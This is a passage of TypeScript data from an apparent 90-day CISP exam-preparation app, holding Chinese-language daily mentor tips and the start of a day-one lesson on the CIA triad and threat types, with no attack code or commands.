    { author: '张伟', title: 'CIA三要素深度解析', content: 'CIA三要素是信息安全的基石。机密性确保数据不被未授权访问，完整性保证数据不被篡改，可用性确保系统随时可用。实践中要注意：加密是机密性的基础，哈希校验是完整性的保障，冗余备份是可用性的关键。', url: '' },
    { author: '李明', title: '安全威胁识别方法', content: '识别威胁要从多个维度入手：外部威胁（黑客、APT组织）、内部威胁（员工误操作、恶意行为）、环境威胁（自然灾害、设备故障）。建议建立威胁情报订阅机制，及时了解最新威胁动态。', url: '' },
  ],
  2: [
    { author: '王芳', title: '信息安全发展趋势', content: '从通信安全到信息化安全，安全的范畴在不断扩大。当前的趋势是零信任架构、AI安全、云安全和数据安全。建议关注NIST、ISO等标准组织的最新发布，保持知识更新。', url: '' },
    { author: '赵强', title: '安全标准演进历程', content: '从TCSEC到ISO 27001，安全标准越来越注重风险管理和持续改进。等保2.0强调"一个中心、三重防护"，建议深入理解其核心思想。', url: '' },
  ],
  3: [
    { author: '孙丽', title: '网络安全分层防御', content: '网络安全需要多层防护：边界防护（防火墙）、网络层（入侵检测）、应用层（WAF）、终端层（EDR）。没有银弹，需要纵深防御策略。', url: '' },
    { author: '周伟', title: 'TCP/IP协议安全', content: '理解TCP/IP协议是网络安全的基础。三次握手、端口扫描、DNS解析等都可能成为攻击入口。建议用Wireshark抓包分析真实流量，加深理解。', url: '' },
  ],
  4: [
    { author: '吴刚', title: '恶意软件分析入门', content: '分析恶意软件需要掌握基本工具：静态分析（IDA Pro、Ghidra）、动态分析（Cuckoo Sandbox）、行为分析（Process Monitor）。建议从简单的恶意软件样本开始练习。', url: '' },
    { author: '郑敏', title: '防病毒策略优化', content: '传统签名检测已经不够，需要结合行为检测和机器学习。建议部署EDR解决方案，建立威胁狩猎能力。定期更新病毒库，保持系统补丁最新。', url: '' },
  ],
  5: [
    { author: '黄磊', title: '社会工程学防范', content: '社会工程攻击成功率极高，因为它针对人性弱点。防范措施包括：安全意识培训、多因素认证、可疑邮件报告机制。记住：官方机构不会通过电话索要密码。', url: '' },
    { author: '陈明', title: '钓鱼邮件识别技巧', content: '识别钓鱼邮件要注意：发件人地址、邮件内容语法、附件类型、紧急语气。建议部署邮件安全网关，对可疑邮件进行沙箱检测。', url: '' },
  ],
  6: [
    { author: '林静', title: '密码学入门指南', content: '学习密码学从基础开始：对称加密、非对称加密、哈希函数。推荐用OpenSSL做实践练习，理解AES、RSA、SHA等算法的使用场景。不要自己实现加密算法！', url: '' },
    { author: '刘洋', title: '密钥管理最佳实践', content: '密钥是加密的核心。建议使用硬件安全模块（HSM）存储密钥，实施密钥轮换策略，定期审计密钥使用情况。避免硬编码密钥！', url: '' },
  ],
  7: [
    { author: '陈婷', title: '第一周学习总结', content: '第一周是基础中的基础，重点掌握CIA三要素和安全威胁分类。建议回顾本周内容，完成练习题检验学习效果。下周将学习法律法规知识，提前做好准备。', url: '' },
    { author: '张明', title: '学习方法建议', content: '信息安全学习需要理论与实践结合。每天保持2小时学习时间，多动手操作。建立知识体系思维导图，定期复习巩固。', url: '' },
  ],
  8: [
    { author: '赵强', title: '网络安全法解读', content: '《网络安全法》是我国网络安全领域的基本法，规定了网络运营者的安全义务、数据保护要求和法律责任。建议逐条研读，理解合规要点。', url: '' },
    { author: '孙丽', title: '数据安全法要点', content: '《数据安全法》强调数据分类分级保护，建立数据安全审查制度。企业需要制定数据安全管理制度，明确数据负责人职责。', url: '' },
  ],
  9: [
    { author: '周伟', title: '等保2.0实施指南', content: '等保2.0核心是"一个中心、三重防护"。实施步骤：定级备案→差距分析→安全建设→测评整改→持续监控。建议聘请专业机构进行合规咨询。', url: '' },
    { author: '吴刚', title: '等保测评准备', content: '测评前准备：整理制度文档、安全策略、运维记录、应急预案。重点关注技术层面：网络架构、访问控制、日志审计、数据保护。', url: '' },
  ],
  10: [
    { author: '郑敏', title: '个人信息保护法解读', content: '《个人信息保护法》赋予个人多项权利：知情权、决定权、删除权、可携带权。企业需要建立个人信息处理合规体系，开展隐私影响评估。', url: '' },
    { author: '黄磊', title: '数据脱敏实践', content: '数据脱敏是保护个人信息的重要手段。常用方法：加密、掩码、替换、删除。根据业务场景选择合适的脱敏方式，确保数据可用性和安全性平衡。', url: '' },
  ],
  11: [
    { author: '陈明', title: '关键信息基础设施保护', content: 'CII是国家安全的关键。运营者需要履行安全保护义务：制定专项保护计划、开展安全评估、建立监测预警体系。建议建立CII资产清单，实施重点保护。', url: '' },
    { author: '林静', title: '供应链安全', content: '供应链攻击日益增多，需要关注第三方组件安全。建议实施软件物料清单（SBOM）管理，定期对供应商进行安全评估。', url: '' },
  ],
  12: [
    { author: '刘洋', title: '网络安全审查要点', content: '网络安全审查关注影响国家安全的网络产品和服务。企业在采购关键设备时需要提前评估，必要时申报审查。建议建立供应商安全评估机制。', url: '' },
    { author: '陈婷', title: '数据出境合规', content: '数据出境需要满足法定条件：安全评估、标准合同、认证等。建议梳理数据流向，识别出境数据，制定合规方案。', url: '' },
  ],
  13: [
    { author: '张明', title: '合规管理体系建设', content: '合规管理需要建立完整体系：政策制度、组织架构、流程管控、技术保障、培训宣贯。建议参考ISO 27001建立信息安全管理体系。', url: '' },
    { author: '李华', title: '安全策略制定', content: '安全策略是安全管理的基石。策略应涵盖：访问控制、密码管理、数据分类、事件响应、应急预案。策略需要定期评审更新。', url: '' },
  ],
  14: [
    { author: '王静', title: '第二周学习总结', content: '法律法规是安全工作的底线。重点掌握等保2.0和数据合规要求。建议建立合规清单，对照检查自身差距。下周将学习访问控制技术。', url: '' },
    { author: '陈刚', title: '合规工具推荐', content: '推荐工具：等保合规检查工具、数据分类分级系统、隐私影响评估模板。利用自动化工具提高合规效率。', url: '' },
  ],
  15: [
    { author: '赵丽', title: '身份认证技术选型', content: '认证方式选择依据安全等级：普通系统用密码+MFA，高安全系统用硬件令牌或生物识别。建议实施密码策略，定期强制修改密码。', url: '' },
    { author: '孙强', title: '多因素认证部署', content: 'MFA是抵御密码泄露的有效手段。推荐使用TOTP（如Google Authenticator）或硬件密钥（如YubiKey）。注意备份恢复机制。', url: '' },
  ],
  16: [
    { author: '周芳', title: '密码安全最佳实践', content: '密码策略：长度至少12位、复杂度要求、定期更换、禁止重复使用。建议使用密码管理器，每个网站使用唯一密码。禁止使用生日、姓名等易猜测信息。', url: '' },
    { author: '吴涛', title: '密码破解防御', content: '防御密码破解：实施账户锁定策略、使用加盐哈希、限制登录尝试次数。建议使用bcrypt或Argon2等高成本哈希算法。', url: '' },
  ],
  17: [
    { author: '郑欣', title: '生物识别技术应用', content: '生物识别方便但有风险：指纹可被复制、面部识别可被欺骗。建议作为多因素认证的第二因素使用，不要单独作为唯一认证方式。', url: '' },
    { author: '黄磊', title: '行为生物识别', content: '行为生物识别是新兴技术：击键节奏、鼠标移动、步态等。可用于连续认证，提高安全性。注意隐私保护问题。', url: '' },
  ],
  18: [
    { author: '林静', title: '多因素认证设计', content: 'MFA组合策略：知识因素（密码）+持有因素（手机）+生物因素（指纹）。至少使用两种不同类型的因素。备份方案要安全可靠。', url: '' },
    { author: '徐鹏', title: '无密码认证趋势', content: '无密码认证是未来方向：FIDO2/WebAuthn协议支持硬件密钥认证。建议关注Passkey技术，逐步减少密码依赖。', url: '' },
  ],
  19: [
    { author: '马丽', title: 'SSO实施策略', content: 'SSO提升用户体验和安全性。选择方案：SAML 2.0适用于企业场景，OAuth 2.0适用于API场景，OpenID Connect适用于身份认证。注意安全配置，避免配置错误导致漏洞。', url: '' },
    { author: '刘伟', title: '身份提供商选择', content: '自建IDP适合大型企业，云IDP适合中小企业。推荐方案：Azure AD、Okta、Keycloak（开源）。关注集成能力和安全合规认证。', url: '' },
  ],
  20: [
    { author: '陈明', title: 'OAuth 2.0深度解析', content: 'OAuth 2.0不是认证协议，是授权协议。核心概念：授权码流程、令牌类型、作用域。注意授权码拦截攻击，使用PKCE增强安全性。', url: '' },
    { author: '杨雪', title: 'SAML与OAuth对比', content: 'SAML适合企业SSO，OAuth适合API授权。SAML基于XML，OAuth基于JSON。根据场景选择合适方案，不要混用。', url: '' },
  ],
  21: [
    { author: '赵云', title: '第三周学习总结', content: '访问控制是安全的核心。重点掌握认证技术和SSO实现。建议动手搭建一个简单的认证系统加深理解。下周将学习安全运营知识。', url: '' },
    { author: '孙燕', title: 'IAM体系建设', content: 'IAM涵盖身份管理、认证管理、授权管理。建议建立完整的IAM体系，实施权限生命周期管理。定期进行权限审计。', url: '' },
  ],
  22: [
    { author: '周杰', title: 'SOC建设指南', content: 'SOC建设需要技术和流程并重。建议分阶段实施：第一阶段建立监控能力，第二阶段建立检测响应能力，第三阶段实现自动化运营。', url: '' },
    { author: '吴敏', title: '安全运营成熟度', content: '从被动响应到主动防御需要时间。建议对照NIST CSF评估当前成熟度，制定改进路线图。工具不是万能的，流程更重要。', url: '' },
  ],
  23: [
    { author: '郑伟', title: '日志管理最佳实践', content: '日志是安全分析的基础。统一日志格式、确保时间同步、保留足够期限。建议使用ELK或Splunk建立集中日志平台。', url: '' },
    { author: '张伟', title: '日志分析技巧', content: '学习使用正则表达式和查询语言分析日志。建立关联分析能力，从海量日志中发现异常行为。关注失败登录、权限变更等关键事件。', url: '' },
  ],
  24: [
    { author: '李明', title: '安全监控体系', content: '监控覆盖网络、主机、应用、云环境。建立告警分级规则，避免告警疲劳。建议实施SOAR平台，实现自动化响应。', url: '' },
    { author: '王芳', title: '威胁情报整合', content: '威胁情报提高检测能力。订阅高质量情报源，整合到SIEM中。注意情报的时效性和准确性，定期评估情报质量。', url: '' },
  ],
  25: [
    { author: '赵强', title: '事件响应流程', content: '事件响应遵循PDCERF模型：准备→检测→抑制→根除→恢复→跟踪。建立清晰的角色职责，定期演练检验流程有效性。', url: '' },
    { author: '孙丽', title: 'SOC值班制度', content: '建立7x24小时值班机制，明确轮班安排和告警响应SLA。配备L1/L2/L3分析师团队，分级处理告警。', url: '' },
  ],
  26: [
    { author: '周伟', title: '应急响应预案', content: '预案需要覆盖常见场景：勒索软件、数据泄露、DDoS攻击、内部威胁。预案要可操作，定期演练更新。建立危机沟通机制。', url: '' },
    { author: '吴刚', title: '取证分析要点', content: '取证要遵循证据链原则。先收集易失性证据（内存），再收集非易失性证据（磁盘）。注意证据完整性，避免破坏原始数据。', url: '' },
  ],
  27: [
    { author: '郑敏', title: '灾难恢复规划', content: '备份策略遵循3-2-1原则：3份数据、2种介质、1份异地。定期测试恢复能力，确保RTO和RPO目标达成。建立异地灾备中心。', url: '' },
    { author: '黄磊', title: '业务连续性管理', content: 'BCM关注业务层面的连续性。识别关键业务流程，制定恢复优先级。定期进行业务影响分析（BIA）和演练。', url: '' },
  ],
  28: [
    { author: '陈明', title: '第四周学习总结', content: '安全运营是安全能力的体现。重点掌握日志管理和事件响应。建议参与一次应急演练，体验真实场景。下周将学习漏洞相关知识。', url: '' },
    { author: '林静', title: '安全运营工具链', content: '推荐工具：SIEM（Splunk/ELK）、EDR（CrowdStrike）、SOAR（Demisto）。根据预算和需求选择合适的解决方案。', url: '' },
  ],
  29: [
    { author: '刘洋', title: '漏洞管理流程', content: '漏洞管理生命周期：发现→评估→修复→验证→跟踪。建立漏洞优先级评估机制，根据CVSS评分和业务影响综合判断。', url: '' },
    { author: '陈婷', title: '漏洞数据库使用', content: '关注CVE、NVD、CNNVD等漏洞数据库。订阅漏洞告警，及时获取关键漏洞信息。建立内部漏洞知识库。', url: '' },
  ],
  30: [
    { author: '张明', title: '常见漏洞类型分析', content: 'OWASP Top 10是Web安全的重点：失效的访问控制、加密失效、注入攻击等。理解每种漏洞的原理和防护方法，结合靶场练习。', url: '' },
    { author: '李华', title: '漏洞挖掘技巧', content: '漏洞挖掘需要掌握：模糊测试、代码审计、逆向分析。从简单的靶场开始，逐步提高难度。遵守漏洞披露规范。', url: '' },
  ],
  31: [{
    author: '赵阳',
    title: '安全研究员',
    content: '第五周总结：漏洞与攻击域的核心是"理解漏洞、管理漏洞、防御漏洞"。CVSS 9.0+ = Critical、SQL注入用参数化查询、XSS 用输出编码+CSP、缓冲区溢出用DEP+ASLR+Canary 是四条硬核考点。'
  }],
  32: [{
    author: '陈静',
    title: '漏洞分析师',
    content: '对称加密核心考点：AES各工作模式对比。ECB不安全、GCM=AEAD双重价值。DES 56位、3DES 有效 112 位和 AES 128/256 位是考试数字考点。'
  }],
  33: [{
    author: '刘刚',
    title: '安全架构师',
    content: '非对称加密考试核心："签名用私钥、验签用公钥、加密用对端公钥"。ECC 256位≈RSA 3072位安全是经典题。DH是密钥交换协议而非加密算法。'
  }],
  34: [{
    author: '孙悦',
    title: '安全运营经理',
    content: '哈希函数核心考点：三大安全特性（抗碰撞=2^(n/2)是陷阱重点）、算法状态（MD5/SHA-1已死、SHA-256是标准）、密码存储（Argon2id是最佳实践）。哈希是单向不可逆的。'
  }],
  35: [{
    author: '周明',
    title: '安全顾问',
    content: '数字签名=私钥签+公钥验，必须刻进脑子的公式。PKI体系是数字签名的信任基础设施，CA是信任锚点。CRL（定期下载）和OCSP（实时查询）是维持PKI信任"新鲜度"的两只手。'
  }],
  36: [{
    author: '张伟',
    title: '密码学专家',
    content: '对称加密深度攻防实战：AES各模式的攻击面、填充预言攻击、侧信道攻击和国密SM4的实现安全。'
  }],
  37: [{
    author: '林芳',
    title: '加密技术顾问',
    content: '非对称加密攻击与防御：RSA/ECC的深度攻击面分析——唯密文攻击、选择密文攻击、时序攻击和密钥管理弱点。'
  }],
  38: [{
    author: '黄强',
    title: '密码学研究员',
    content: '哈希攻防实战：碰撞攻击实际案例、长度扩展攻击原理和HMAC的安全性分析。SHA-1已被实际碰撞破解，必须迁移到SHA-256。'
  }],
  39: [{
    author: '吴敏',
    title: 'PKI架构师',
    content: '数字签名与PKI部署实战：证书透明化(CT)、证书钉扎(Certificate Pinning)和PKI信任模型的深度解析。'
  }],
  40: [{
    author: '郑宇',
    title: '密码学讲师',
    content: 'PKI体系架构核心考点：CP/CPS的区别、密钥生命周期、HSM的作用、CT的背景——PKI不仅是技术还有管理维度。'
  }],
  41: [{
    author: '钱磊',
    title: '信息安全专家',
    content: 'TLS/SSL协议深度解析：TLS 1.3握手优化、常见攻击（降级攻击、中间人攻击）和服务器安全配置最佳实践。'
  }],
  42: [{
    author: '韩冰',
    title: '密码算法工程师',
    content: '第六周完成！密码学是信息安全的核心技术支撑。下周学习网络安全——防火墙、IDS/IPS、VPN和无线安全等关键网络防护技术。'
  }],
  43: [{
    author: '徐峰',
    title: '网络安全专家',
    content: '网络协议安全：TCP/IP协议栈安全分析与攻击防御——ARP欺骗、IP欺骗、ICMP攻击、DNS投毒和BGP劫持的原理与防御。'
  }],
  44: [{
    author: '何琳',
    title: '网络攻防讲师',
    content: '防火墙技术：包过滤、状态检测、应用代理和下一代防火墙的部署与安全策略配置。'
  }],
  45: [{
    author: '马超',
    title: '网络安全工程师',
    content: '入侵检测与防御：IDS vs IPS的本质区别、Snort规则编写、四种检测方法（签名/异常/协议/信誉）和部署策略。'
  }],
  46: [{
    author: '罗艳',
    title: '网络协议分析师',
    content: 'VPN技术：IPsec、SSL VPN和WireGuard的架构与安全性对比分析。'
  }],
  47: [{
    author: '孙鹏',
    title: '防火墙专家',
    content: '无线网络安全：WPA3、802.1X、Rogue AP和KARMA攻击的防御——Wi-Fi安全协议与攻击防护全解析。'
  }],
  48: [{
    author: '杨洁',
    title: '网络架构师',
    content: '网络分段与零信任：VLAN隔离、微分段和零信任网络架构的设计原则与实施。'
  }],
  49: [{
    author: '周斌',
    title: 'IDS/IPS工程师',
    content: '第七周完成！网络安全是CISP考试高频考点。下周学习应用安全——OWASP Top 10、SQL注入、XSS、CSRF等Web安全核心技术。'
  }],
  50: [{
    author: '赵云',
    title: '应用安全专家',
    content: 'Web安全基础：OWASP Top 10与HTTP安全机制——安全头配置、同源策略和现代Web安全基线。'
  }],
  51: [{
    author: '魏红',
    title: 'Web安全研究员',
    content: 'SQL注入进阶：盲注技术、二次注入、绕过WAF技巧和参数化查询的深层防御原理。'
  }],
  52: [{
    author: '蒋涛',
    title: '安全开发工程师',
    content: 'XSS进阶攻击与防御：DOM型XSS、mXSS、CSP策略设计和前端安全框架的最佳实践。'
  }],
  53: [{
    author: '沈琳',
    title: '应用安全顾问',
    content: 'CSRF防御体系：Token机制、SameSite Cookie、Referer验证和现代框架防护方案。'
  }],
  54: [{
    author: '韩磊',
    title: '代码审计专家',
    content: '文件上传攻击与防御：绕过技术、服务端检测、恶意文件识别和安全上传实现。'
  }],
  55: [{
    author: '朱敏',
    title: '安全测试工程师',
    content: '安全编码实践：安全开发生命周期与SAST——安全编码规范、静态分析工具和DevSecOps实践集成。'
  }],
  56: [{
    author: '秦刚',
    title: 'DevSecOps顾问',
    content: '第八周完成！应用安全是防御体系的最终防线。掌握OWASP Top 10和各项攻击防御技术，才能保护应用安全。下周学习物理安全。'
  }],
  57: [{
    author: '许阳',
    title: '物理安全专家',
    content: '物理安全基础：分层物理防护与安全区域——周边防护、建筑物安全和机房安全分层的设计原则。'
  }],
  58: [{
    author: '何芳',
    title: '数据中心架构师',
    content: '物理访问控制：门禁系统、生物识别——RFID、生物特征识别和多因素物理认证机制。'
  }],
  59: [{
    author: '吕强',
    title: '物理安全审计师',
    content: '环境安全：防火、防水、电力与环境控制——FM200气体灭火、精密空调和UPS供电系统的安全要求。'
  }],
  60: [{
    author: '施琳',
    title: '灾备规划师',
    content: '数据中心安全：Tier I-IV分级体系、冗余设计和TIA-942建设标准。'
  }],
  61: [{
    author: '张斌',
    title: 'PACS顾问',
    content: '容灾备份：3-2-1备份原则、RTO/RPO和灾难恢复测试方法。'
  }],
  62: [{
    author: '丁悦',
    title: '设施管理专家',
    content: '监控系统：CCTV部署、PIR传感器和水浸检测——视频监控、入侵报警与环境监控的安全集成。'
  }],
  63: [{
    author: '龚宇',
    title: '数据中心经理',
    content: '第九周物理安全体系回顾：分层防护原则、环境控制标准和数据中心运维安全。下周进入安全工程领域。'
  }],
  64: [{
    author: '余敏',
    title: '安全管理专家',
    content: '安全评估概述：风险评估方法论与实践——定量vs定性评估、SLE/ALE计算和风险处置策略。'
  }],
  65: [{
    author: '潘峰',
    title: '应急响应顾问',
    content: '威胁建模：STRIDE、攻击树与安全设计——威胁建模方法论、安全需求提取和架构风险分析。'
  }],
  66: [{
    author: '戴强',
    title: '安全审计师',
    content: '安全架构设计：纵深防御、最小权限、默认安全——安全架构原则、模式与实践。'
  }],
  67: [{
    author: '宋琳',
    title: '合规管理师',
    content: '安全开发生命周期(SDL)：需求阶段安全分析、威胁建模和SDL各阶段安全活动实践。'
  }],
  68: [{
    author: '卢刚',
    title: '风险管理专家',
    content: '代码审计：手动审查vs自动化SAST、常见漏洞模式和修复建议——安全代码审查方法论与实践。'
  }],
  69: [{
    author: '田静',
    title: '安全策略顾问',
    content: '安全测试与渗透测试：黑盒/白盒/灰盒测试、渗透测试流程和漏洞验证方法。'
  }],
  70: [{
    author: '贾明',
    title: 'BIA/BCP规划师',
    content: '第十周安全工程体系回顾与测验：风险评估、威胁建模、安全架构和SDL的综合检验。'
  }],
  71: [{
    author: '蔡琳',
    title: '隐私保护专家',
    content: '数据隐私法规与保护技术：PIPL核心要求、数据出境三种机制和PIA触发条件。'
  }],
  72: [{
    author: '谢涛',
    title: '数据治理顾问',
    content: '数据加密存储：五层加密模型、FDE/TDE/文件级加密和KMS密钥管理。'
  }],
  73: [{
    author: '曾敏',
    title: '合规审计师',
    content: '数据脱敏技术：静态脱敏(SDM)vs动态脱敏(DDM)、5种脱敏算法和FPE保留格式加密。'
  }],
  74: [{
    author: '袁强',
    title: '隐私法律顾问',
    content: '数据生命周期管理：数据分类分级、安全销毁方法和DLP三种部署模式。'
  }],
  75: [{
    author: '邓芳',
    title: 'DPO数据保护官',
    content: '隐私合规实践：有效同意五要素、DSAR标准流程和隐私合规审计核心检查项。'
  }],
  76: [{
    author: '萧磊',
    title: 'PIPL/CSL顾问',
    content: '数据治理体系：数据质量管理、元数据管理和数据血缘分析——企业数据治理框架与实践。'
  }],
  77: [{
    author: '尹静',
    title: '数据安全工程师',
    content: '第十一周最终冲刺！Day 78 开始模拟考试周——CISP全面模拟测试！77/84=92%，你已掌握CISP核心体系。'
  }],

78: [
    { author: '张明', title: 'CISP模拟考试一分析', content: '第一套模拟侧重基础记忆。重点关注CIA三要素、等保五级和关键数字。每道错题都回到原始章节重新理解,不要只看答案。', url: '' },
  ],
  79: [
    { author: '王静', title: '第二套模拟题特点', content: '第二套题侧重场景应用和综合分析,难度稍高。特别注意情境判断题,抓住题干关键约束条件。对比两套试卷全面发现薄弱点。', url: '' },
  ],
  80: [
    { author: '赵强', title: '易错点系统梳理', content: '最易混淆:BLP vs Biba(规则相反)、AH vs ESP(加密有无)、SAST vs DAST(静态/动态)、RTO vs RPO(时间/点)。建立对比表格反复记忆。', url: '' },
  ],
  81: [
    { author: '周伟', title: '知识体系串联方法', content: '将11个知识域画成思维导图,用线连接关联概念。CIA→密码学→访问控制→网络安全→数据安全,形成完整链条。理解关系比死记更重要。', url: '' },
  ],
  82: [
    { author: '郑敏', title: '冲刺阶段策略', content: '考前冲刺:①过口诀(30条每天一遍);②看错题(只看错题本,不做新题);③保持手感(每天10-20道随机题)。不过度学习,保持状态。', url: '' },
  ],
  83: [
    { author: '陈明', title: 'CISP考场实战经验', content: '实际考试:①先花2分钟快速浏览试卷;②严格按三阶段时间管理;③不会的题标记跳过;④特别注意\'不属于/错误/除了\'等否定词。', url: '' },
  ],
  84: [
    { author: '张伟', title: '84天学习回顾', content: '恭喜完成84天CISP备考!从CIA三要素到PICERL应急响应,从BLP到零信任,你已掌握CISP核心体系。剩下的就是从容赴考。CISP只是安全生涯起点。', url: '' },
  ],
  85: [
    { author: 'CISP导师', title: '信息安全基础与法律法规专项复习', content: '重点回顾CIA三要素、等保制度、网络安全法等基础考点。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  86: [
    { author: 'CISP导师', title: '密码学与访问控制专项复习', content: 'BLP/Biba对比、AES/RSA/ECC参数、Kerberos/OAuth/SAML认证协议对比。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  87: [
    { author: 'CISP导师', title: '网络安全与应急响应专项复习', content: 'PICERL六步法、RTO/RPO区分、TLS1.3改进、IDS/IPS差异、BCP/DRP关系。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  88: [
    { author: 'CISP导师', title: '应用安全与攻防技术专项复习', content: 'OWASP Top10 2021、SQLi/XSS/CSRF/SSRF防御、SAST/DAST区分、STRIDE威胁建模。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  89: [
    { author: 'CISP导师', title: '风险管理与数据安全专项复习', content: 'SLE=AV×EF/ALE公式、风险处置四策略、数据脱敏SDM/DDM、3-2-1备份规则。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],
  90: [
    { author: 'CISP导师', title: '考前最后总复习与心态调整', content: '回顾全部30条冲刺口诀、确认考试物品和策略、调整最佳考试心态。60分万岁!。', url: '' },
    { author: '安全专家', title: '考前最后建议', content: '考试前夕保持正常作息,回顾错题本和口诀,确认考试物品。你已经准备好了!', url: '' },
  ],};

// Complete learning content for all 90 days
const allDays: LearningDay[] = [
  // ========== Week 1: 信息安全基础 ==========
  {
    id: 'day-1', day: 1, week: 1, title: '信息安全的定义',
    objectives: ['理解信息安全概念', '掌握CIA三要素', '了解安全威胁分类'],
    content: '# 信息安全概述\n\n> 📋 **本节大纲**　一、什么是信息安全 · 二、CIA三要素详解（机密性/完整性/可用性，含破坏案例+5项防护措施） · 三、CIA要素的制约关系 · 四、威胁分类（按来源/按行为/五大常见威胁详解） · 五、\n## 🔴 高频考点\n\n· CIA三要素是所有CISP考题的基础框架，必须能默写三个英文全称\n· 内部威胁vs外部威胁的本质区别：**前者拥有合法访问权限**，这是最高频的判断题陷阱\n· 被动攻击（窃听/不留下痕迹）vs主动攻击（篡改/会留日志）的检测难度对比，考试常考\n## 💜 记忆口诀\n\n· **CIA三要素**：C=看不到(Confidentiality)、I=改不了(Integrity)、A=用得了(Availability)\n· **内部威胁**："权限是工作需要，也是威胁来源"\n· **被动vs主动**："被动悄悄看(窃听/难检测)、主动动手改(篡改/留痕迹)"\n学习建议与考点速记\n\n## 什么是信息安全？\n\n信息安全（Information Security）是指保护信息及信息系统免受未经授权的访问、使用、披露、破坏、修改或销毁，确保信息在产生、传输、存储、处理、销毁全生命周期中的安全。\n\n信息安全的保护对象不仅仅是"数据"，还包括：\n- **硬件**：服务器、网络设备、存储设备\n- **软件**：操作系统、应用程序、数据库\n- **数据**：数据库记录、文件、通信内容\n- **人员**：员工、客户、合作伙伴的信息\n- **流程**：业务流程、操作规程\n\n信息安全的终极目标是保障组织业务在面临威胁时能够持续运行，保护组织的核心资产（数据、声誉、客户信任）不受损害。\n\n## CIA三要素（信息安全铁三角）\n\nCIA三要素是信息安全最基础的理论框架，所有安全控制措施都是围绕这三个目标设计的。CISP考试必考，请务必深入理解每一个要素的含义和对应的防护措施。\n\n### 一、机密性（Confidentiality）\n\n**定义：**确保信息仅能被授权的个人、实体或进程访问，防止未授权的信息泄露。\n\n**通俗理解：**不该看的人看不到。就像你的银行账户余额，只有你和银行有权查看，其他人不应知道。\n\n**机密性被破坏的典型案例：**\n- 某公司客户数据库被黑客拖库，数百万用户信息泄露\n- 员工将内部文件通过个人邮箱发送给竞争对手\n- 公共场所讨论涉密项目被他人听到\n\n**实现机密性的主要技术措施：**\n1. **数据加密**：AES-256加密静态数据，TLS 1.3加密传输数据\n2. **访问控制**：基于角色的权限管理（RBAC），确保只有授权人员能读取\n3. **身份认证**：多因素认证（MFA）验证访问者身份\n4. **数据分类分级**：将数据按敏感程度分级，对不同级别施加不同保护\n5. **物理安全**：门禁系统、访客管理，防止未授权人员接近设备\n\n### 二、完整性（Integrity）\n\n**定义：**确保信息在存储和传输过程中不被未授权地修改或破坏，保证信息的准确性和一致性。\n\n**通俗理解：**信息不能被偷偷改掉。就像你的银行转账记录，不能被人从100元改成10000元，也不能丢失任何一条记录。\n\n**完整性被破坏的典型案例：**\n- 中间人攻击篡改在线交易的收款账户信息\n- 数据库管理员私自修改自己的工资记录\n- 恶意软件在文件传输中植入后门代码\n- 存储介质故障导致数据部分损坏\n\n**实现完整性的主要技术措施：**\n1. **哈希校验**：SHA-256计算文件摘要，传输前后比对确保未被修改\n2. **数字签名**：用私钥对数据签名，公钥验证签名确认来源和完整性\n3. **版本控制**：Git/SVN记录每次修改，可追溯、可回滚\n4. **访问控制 + 审计日志**：限制谁能修改数据，记录谁改了什么\n5. **RAID/冗余存储**：防止硬件故障导致的数据损坏\n\n### 三、可用性（Availability）\n\n**定义：**确保授权用户在需要时能够及时、可靠地访问信息和信息系统。\n\n**通俗理解：**要用的时候能用。银行APP在你想转账的时候必须能打开，不能动不动就"系统维护中"。\n\n**可用性被破坏的典型案例：**\n- DDoS攻击导致网站无法访问（如某电商双11期间被攻击宕机）\n- 服务器硬件故障导致业务中断数小时\n- 勒索软件加密了所有文件导致业务瘫痪\n- 数据中心断电/火灾导致全站服务不可用\n\n**实现可用性的主要技术措施：**\n1. **冗余备份**：双机热备、数据库主从同步，一台故障另一台接管\n2. **负载均衡**：多台服务器分担流量，单台过载不影响整体服务\n3. **容灾恢复**：异地多活数据中心，灾难时可快速切换\n4. **DDoS防护**：流量清洗、CDN分发、黑洞路由\n5. **UPS不间断电源**：防止断电导致服务器宕机\n\n### CIA三要素的关系\n\nCIA三者相互关联、相互制约。过度强化一项可能削弱另一项：\n- 过度加机密性（如严格加密）可能降低可用性（解密耗时）\n- 过度强化可用性（如开放更多访问）可能损害机密性\n- 安全设计的核心是找到三者之间的最佳平衡点\n\n**CISP考试记忆技巧：C=看不到、I=改不了、A=用得了**\n\n## 信息安全威胁分类\n\n了解威胁是防御的前提。信息安全威胁可以从多个维度分类：\n\n### 按威胁来源分类\n\n**内部威胁（Insider Threat）：**\n- 来源：组织内部的员工、承包商、合作伙伴\n- 无意威胁：员工误操作删除数据、误点钓鱼邮件、丢失存有敏感数据的U盘\n- 恶意威胁：离职员工报复性删除数据、内部人员窃取商业机密卖钱\n- 特点：拥有合法访问权限，最难防范——权限是工作需要，也是威胁源头\n- 防御：最小权限原则、职责分离、离职即时回收权限、DLP数据防泄漏\n\n**外部威胁（External Threat）：**\n- 来源：黑客组织、网络犯罪分子、竞争对手、国家级APT组织\n- 方式：漏洞利用、钓鱼攻击、DDoS攻击、供应链攻击\n- 特点：没有合法权限，需要先"攻入"系统\n- 防御：防火墙、IDS/IPS、WAF、漏洞管理、渗透测试\n\n### 按威胁行为分类\n\n**被动威胁（Passive Attack）：**\n- 攻击者仅监听和收集信息，不修改系统\n- 典型手法：流量嗅探、窃听通信、流量分析（分析通信模式推断信息）\n- 特点：难以检测——攻击者不留下痕迹\n- 防御：数据加密（即使被窃听也无法解密）\n\n**主动威胁（Active Attack）：**\n- 攻击者主动修改系统或数据\n- 典型手法：篡改数据、拒绝服务攻击、重放攻击、伪造身份\n- 特点：更容易检测——攻击行为会产生日志和异常\n- 防御：入侵检测（IDS）、完整性校验、访问控制\n\n### 常见威胁类型详解\n\n**1. 恶意软件（Malware）：**\n- 病毒（Virus）：需要宿主程序，用户执行感染文件时触发\n- 